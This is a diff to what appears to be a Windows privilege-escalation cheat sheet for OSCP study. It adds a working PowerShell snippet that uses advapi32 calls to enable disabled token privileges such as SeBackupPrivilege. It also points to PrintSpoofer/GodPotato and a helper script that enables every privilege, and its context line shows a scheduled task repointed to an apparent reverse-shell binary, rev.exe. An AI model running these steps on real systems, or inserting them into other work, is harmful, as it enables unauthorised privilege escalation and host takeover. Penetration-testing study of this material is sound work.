@@ -152,7 +152,27 @@ schtasks /change /tn "<TaskName>" /tr "C:\Windows\Temp\rev.exe"
 
 ## 4. Other Privileged-Token Abuse
 
-Check held privileges first — `whoami /priv` lists every enabled/disabled privilege on the current token. A privilege that shows `Disabled` still usually needs enabling (`Enable-SePrivilege` from PowerUp, or PS Empire's helper, or Cobalt's `token::` — for OSCP, `whoami /priv` + manual `AdjustTokenPrivileges` via a small tool like `EnableAllTokenPrivs.ps1` gets you there); many are held disabled-by-default under a restricted admin token but are trivially re-enabled by the same user.
+Check held privileges first — `whoami /priv` lists every enabled/disabled privilege on the current token. A privilege that shows `Disabled` is still fully usable: the user who holds it can always enable it. In practice you rarely toggle it by hand because the exploit tools do it for you — **PrintSpoofer/GodPotato enable `SeImpersonate` themselves**, and the `diskshadow`/`reg save` SeBackup paths below run as a plain admin. For the cases where you must flip a `Disabled` privilege manually:
+
+```powershell
+# Option A — no download: enable one privilege inline via the Win32 API. Swap SeBackupPrivilege for
+# whatever `whoami /priv` shows as Disabled (SeImpersonatePrivilege, SeRestorePrivilege, ...).
+$s=@'
+[DllImport("advapi32.dll",SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h,int a,out IntPtr t);
+[DllImport("advapi32.dll",SetLastError=true)] public static extern bool LookupPrivilegeValue(string s,string n,out long l);
+[DllImport("advapi32.dll",SetLastError=true)] public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TP p,int b,IntPtr q,IntPtr r);
+[StructLayout(LayoutKind.Sequential,Pack=1)] public struct TP{public int Count;public long Luid;public int Attr;}
+'@
+$w=Add-Type -MemberDefinition $s -Name W -Namespace E -PassThru
+[IntPtr]$t=0; $w::OpenProcessToken([Diagnostics.Process]::GetCurrentProcess().Handle,0x28,[ref]$t) |Out-Null
+$tp=New-Object E.W+TP; $tp.Count=1; $tp.Attr=0x2   # SE_PRIVILEGE_ENABLED
+$w::LookupPrivilegeValue($null,"SeBackupPrivilege",[ref]$tp.Luid) |Out-Null
+$w::AdjustTokenPrivileges($t,$false,[ref]$tp,0,[IntPtr]::Zero,[IntPtr]::Zero) |Out-Null
+whoami /priv | findstr /i backup                    # confirm it now reads Enabled
+
+# Option B — one-file helper that enables EVERY held privilege at once (download it):
+#   EnableAllTokenPrivs.ps1 (gtworek/PSBits), then dot-source it:  . .\EnableAllTokenPrivs.ps1
+```
 
 ### 4a. SeBackupPrivilege (+ SeRestorePrivilege)
 **Explanation**
